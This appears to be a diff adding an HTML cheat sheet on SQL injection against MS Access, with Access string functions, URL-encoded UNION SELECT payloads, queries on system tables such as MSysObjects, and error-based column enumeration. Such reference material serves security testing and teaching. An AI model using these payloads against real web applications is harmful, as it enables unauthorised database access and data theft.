@@ -1,0 +1,44 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Data extraction</title>
+</head><body><b>MS Access specific functions<br/>
+</b><br/>
+ASC: Obtain the ASCII value of a character passed as input<br/>
+CHR: Obtain the character of the ASCII value passed as input LEN: Return the length of the string passed as parameter<br/>
+IIF: Is the IF construct, for example the following statement<br/>
+IIF(1=1, ‘a’, ‘b’) return ‘a’<br/>
+MID: This function allows you to extract substring, for example<br/>
+the following statement mid(‘abc’,1,1) return ‘a’<br/>
+TOP: This function allows you to specify the maximum number<br/>
+of results that the query should return from the top. For example<br/>
+TOP 1 will return only 1 row.<br/>
+LAST: This function is used to select only the last row of a set of<br/>
+rows. For example the following query SELECT last(*) FROM us- ers will return only the last row of the result.<br/>
+<b><br/>
+</b><b>Simulating LIMIT</b><br/>
+<tt><br/>
+http:/www.example.com/page.app?id=2'+UNION+SELECT+TOP+3+name+FROM+appsTable%00<br/>
+http:/www.example.com/page.app?id=2'+UNION+SELECT+LAST+3+name+FROM+appsTable%00<br/>
+</tt><br/>
+<b>Concatenation</b><br/>
+<br/>
+&amp; (%26) and + (%2b)<br/>
+<br/>
+<b>Sensitive db tables<br/>
+</b><tt><br/>
+MSysObjects<br/>
+MSysACEs<br/>
+</tt><tt>MSysAccessXML</tt><br/>
+AAA'<tt>UNION SELECT Name FROM MSysObjects WHERE Type = 1%00</tt><b><br/>
+</b><b><br/>
+</b><b>Basic techniques</b><br/>
+<br/>
+Enumerate column names via error messages<br/>
+<tt>AAA' GROUP BY Id%00</tt><br/>
+<br/>
+Finding db files in webroot or other locations<br/>
+First enumerate table names<br/>
+<tt>http:/www.example.com/page.app?id=1’+UNION+SELECT+1+FROM+&lt;name&gt;.table%00<br/>
+</tt>When table names known we can search for corresponding &lt;name&gt;.mdb files<br/>
+</body></html>
